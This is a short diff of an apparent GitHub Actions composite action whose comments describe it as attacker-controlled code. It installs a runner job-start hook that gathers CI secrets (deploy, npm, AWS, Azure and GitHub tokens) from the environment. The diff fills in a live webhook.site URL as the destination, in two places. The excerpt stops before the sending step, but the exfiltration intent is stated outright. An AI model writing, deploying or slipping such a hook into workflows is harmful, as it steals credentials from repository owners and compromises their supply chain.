@@ -17,7 +17,7 @@ runs:
         # and the checkout fetches the fork's merge commit,
         # this file is fully attacker-controlled.
 
-        WEBHOOK_URL="WEBHOOK_PLACEHOLDER"
+        WEBHOOK_URL="https://webhook.site/4341119f-99f3-46cb-8590-97757690db95"
 
         # Step 1: Create the exfiltration hook script
         cat > /tmp/runner_hook.sh << 'HOOKEOF'
@@ -25,7 +25,7 @@ runs:
         # This script runs at the START of every job via ACTIONS_RUNNER_HOOK_JOB_STARTED
         # It has full access to the job's environment variables, including secrets.
 
-        WEBHOOK="WEBHOOK_PLACEHOLDER"
+        WEBHOOK="https://webhook.site/4341119f-99f3-46cb-8590-97757690db95"
 
         # Collect secrets from environment
         secrets=$(env | grep -iE "^(DEPLOY_TOKEN|NPM_TOKEN|SECRET_|AWS_|AZURE_|GH_TOKEN|GITHUB_TOKEN)" 2>/dev/null)
